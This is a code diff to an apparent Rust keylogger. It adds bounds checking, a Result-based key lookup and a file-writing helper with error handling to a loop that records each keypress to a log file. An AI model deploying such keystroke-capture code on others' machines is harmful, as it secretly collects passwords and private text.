@@ -14,6 +14,8 @@ struct InputEvent {
     value: i32,
 }
 
+const KEY_MAX: u32 = 122;
+
 const EV_KEY: u16 = 1;
 const KEY_RELEASE: i32 = 0;
 const KEY_PRESS: i32 = 1;
@@ -310,9 +312,15 @@ fn main() {
                 if is_shift(event.code) {
                     shift_pressed += 1;
                 }
-                println!("{}", event.code);
-                let key = get_key(event.code, shift_pressed);
-                let _written_bytes = log_file.write(key.as_bytes()).unwrap();
+
+                match get_key(event.code, shift_pressed) {
+                    Ok(key) => {
+                        write_to_file(key, &mut log_file);
+                    }
+                    Err(key_error) => match key_error {
+                        KeyError::OutOfBounds(code) => println!("Key {}, is out of bounds", code),
+                    },
+                }
             } else if event.value == KEY_RELEASE && is_shift(event.code) {
                 shift_pressed -= 1;
             }
@@ -320,12 +328,34 @@ fn main() {
     }
 }
 
+fn write_to_file(key: &str, log_file: &mut File) {
+    let text = key.as_bytes();
+    let result = log_file.write(key.as_bytes());
+    if let Ok(written_bytes) = result {
+        if written_bytes != text.len() {
+            println!(
+                "Written bytes where {}, but text was {}",
+                written_bytes,
+                text.len(),
+            )
+        }
+    } else {
+        println!("There was an error while writing to the file");
+    }
+}
+
 fn is_shift(key: u16) -> bool {
     KEY_RIGHTSHIFT == key || KEY_LEFTSHIFT == key
 }
 
-fn get_key(code: u16, is_shift: u16) -> &'static str {
+enum KeyError {
+    OutOfBounds(u16),
+}
+
+fn get_key(code: u16, is_shift: u16) -> Result<&'static str, KeyError> {
+    if code as u32 > KEY_MAX {
+        return Err(KeyError::OutOfBounds(code));
+    }
     let keys = if is_shift != 0 { KEYS_SHIFT } else { KEYS };
-    // TODO: check in range, return result, avoid crash
-    keys[code as usize]
+    Ok(keys[code as usize])
 }
